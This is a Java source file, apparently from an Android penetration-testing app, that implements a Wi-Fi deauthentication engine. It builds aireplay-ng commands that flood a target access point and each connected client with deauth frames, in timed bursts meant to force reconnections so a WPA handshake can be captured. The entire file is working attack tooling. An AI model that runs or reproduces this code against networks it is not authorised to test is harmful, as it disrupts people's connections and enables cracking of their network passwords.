package com.zalexdev.stryker.wifi;

import androidx.annotation.Nullable;

import com.zalexdev.stryker.utils.Core;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.Locale;
import java.util.Set;

/**
 * Shared deauth helpers for single-AP and handshake capture.
 * Uses short aireplay bursts (broadcast + per-client) instead of a permanent
 * flood that prevents stations from reconnecting (and completing a handshake).
 */
public final class WifiDeauthEngine {

    /** Seconds to wait after a burst before the next one (wifite-style). */
    public static final int BURST_INTERVAL_SEC = 10;

    /** Frames per broadcast burst. */
    public static final int BROADCAST_COUNT = 5;

    /** Frames per directed (client) burst. */
    public static final int CLIENT_COUNT = 3;

    private WifiDeauthEngine() {
    }

    /**
     * Fire one deauth round: broadcast to the BSSID, then directed frames to
     * each known client MAC. Blocking — call from a worker thread.
     */
    public static String fireBurst(Core core, String iface, String bssid,
                                   @Nullable Iterable<String> clients) {
        if (core == null || iface == null || bssid == null) {
            return "deauth skipped (missing args)";
        }
        String b = bssid.trim();
        StringBuilder log = new StringBuilder();
        String bcCmd = String.format(Locale.US,
                "aireplay-ng --ignore-negative-one -0 %d -a %s %s",
                BROADCAST_COUNT, b, iface);
        core.customChrootCommand(bcCmd);
        log.append("broadcast x").append(BROADCAST_COUNT);

        Set<String> unique = new LinkedHashSet<>();
        if (clients != null) {
            for (String c : clients) {
                if (c == null) continue;
                String mac = c.trim().toLowerCase(Locale.US);
                if (!mac.contains(":") || mac.equalsIgnoreCase(b)) continue;
                unique.add(mac);
            }
        }
        int n = 0;
        for (String client : unique) {
            String cmd = String.format(Locale.US,
                    "aireplay-ng --ignore-negative-one -0 %d -a %s -c %s %s",
                    CLIENT_COUNT, b, client, iface);
            core.customChrootCommand(cmd);
            n++;
        }
        if (n > 0) {
            log.append(" + ").append(n).append(" client(s) x").append(CLIENT_COUNT);
        }
        return log.toString();
    }

    public static ArrayList<String> copyClients(Iterable<String> source) {
        ArrayList<String> out = new ArrayList<>();
        if (source == null) return out;
        for (String c : source) {
            if (c != null && c.contains(":")) out.add(c.trim());
        }
        return out;
    }
}
